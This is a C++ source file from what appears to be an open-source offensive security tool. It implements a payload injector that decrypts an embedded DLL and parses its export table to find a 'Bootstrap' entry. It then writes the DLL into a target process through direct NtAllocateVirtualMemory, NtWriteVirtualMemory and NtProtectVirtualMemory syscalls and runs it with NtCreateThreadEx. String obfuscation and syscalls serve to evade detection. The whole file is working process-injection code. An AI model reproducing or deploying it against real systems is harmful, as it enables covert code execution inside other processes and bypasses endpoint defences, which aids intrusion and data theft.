// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "injector.hpp"
#include "../crypto/crypto.hpp"
#include "../sys/internal_api.hpp"
#include "../payload/payload_data.hpp"
#include <sstream>

namespace Injector {

    PayloadInjector::PayloadInjector(ProcessManager& process, const Core::Console& console)
        : m_process(process), m_console(console) {}

    void PayloadInjector::Inject(const std::wstring& pipeName) {
        m_console.Debug(OBF("Deriving runtime decryption keys..."));
        LoadAndDecryptPayload();
        m_console.Debug(std::string(OBF(" [+] Payload decrypted (")) + std::to_string(m_payload.size() / 1024) + OBF(" KB)"));

        DWORD offset = GetExportOffset(OBF("Bootstrap"));
        if (offset == 0) {
            throw std::runtime_error(OBF("Could not find entry point in payload"));
        }
       
        std::stringstream ss;
        ss << OBF(" [+] Bootstrap entry point resolved (offset: 0x") << std::hex << offset << OBF(")");
        m_console.Debug(ss.str());

        PVOID remoteBase = nullptr;
        SIZE_T payloadSize = m_payload.size();
        SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalSize = payloadSize + pipeNameSize;

        m_console.Debug(OBF("Allocating memory in target process via syscall..."));
        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase, 0,
                                                          &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0) throw std::runtime_error(OBF("Allocation failed"));

        ss.str("");
        ss << OBF(" [+] Memory allocated at 0x") << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
           << OBF(" (") << std::dec << (totalSize / 1024) << OBF(" KB)");
        m_console.Debug(ss.str());

        SIZE_T written = 0;
        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remoteBase,
                                              m_payload.data(), payloadSize, &written);
        if (status != 0) throw std::runtime_error(OBF("Write payload failed"));

        LPVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remotePipeName,
                                              (PVOID)pipeName.c_str(), pipeNameSize, &written);
        if (status != 0) throw std::runtime_error(OBF("Write params failed"));

        m_console.Debug(OBF(" [+] Payload + parameters written"));

        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
                                                &totalSize, PAGE_EXECUTE_READ, &oldProtect);
        if (status != 0) throw std::runtime_error(OBF("Protection change failed"));

        m_console.Debug(OBF(" [+] Memory protection set to PAGE_EXECUTE_READ"));

        uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;
        HANDLE hThread = nullptr;
        m_console.Debug(OBF("Creating remote thread via syscall..."));
        status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, nullptr, m_process.GetProcessHandle(),
                                          (LPTHREAD_START_ROUTINE)entry, remotePipeName, 0, 0, 0, 0, nullptr);
       
        if (status != 0) throw std::runtime_error(OBF("Thread creation failed"));

        ss.str("");
        ss << OBF(" [+] Thread created (entry: 0x") << std::hex << entry << OBF(")");
        m_console.Debug(ss.str());

        if (hThread) NtClose_syscall(hThread);
    }

    void PayloadInjector::LoadAndDecryptPayload() {
        m_payload.assign(Payload::Embedded::Data, Payload::Embedded::Data + Payload::Embedded::Size);
        if (m_payload.empty()) {
            throw std::runtime_error(OBF("Embedded payload is empty"));
        }
        if (!Crypto::DecryptPayload(m_payload)) {
            throw std::runtime_error(OBF("Failed to derive decryption keys"));
        }
    }

    DWORD PayloadInjector::GetExportOffset(const char* exportName) {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_payload.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(m_payload.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

        auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRva == 0) return 0;

        auto RvaToPtr = [&](DWORD rva) -> void* {
            auto section = IMAGE_FIRST_SECTION(ntHeaders);
            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
                if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize) {
                    return m_payload.data() + section->PointerToRawData + (rva - section->VirtualAddress);
                }
            }
            return nullptr;
        };

        auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToPtr(exportDirRva);
        if (!exportDir) return 0;

        auto names = (DWORD*)RvaToPtr(exportDir->AddressOfNames);
        auto ordinals = (WORD*)RvaToPtr(exportDir->AddressOfNameOrdinals);
        auto funcs = (DWORD*)RvaToPtr(exportDir->AddressOfFunctions);
        if (!names || !ordinals || !funcs) return 0;

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
            char* name = (char*)RvaToPtr(names[i]);
            if (name && strcmp(name, exportName) == 0) {
                void* funcPtr = RvaToPtr(funcs[ordinals[i]]);
                if (!funcPtr) return 0;
                return (DWORD)((uintptr_t)funcPtr - (uintptr_t)m_payload.data());
            }
        }
        return 0;
    }
}
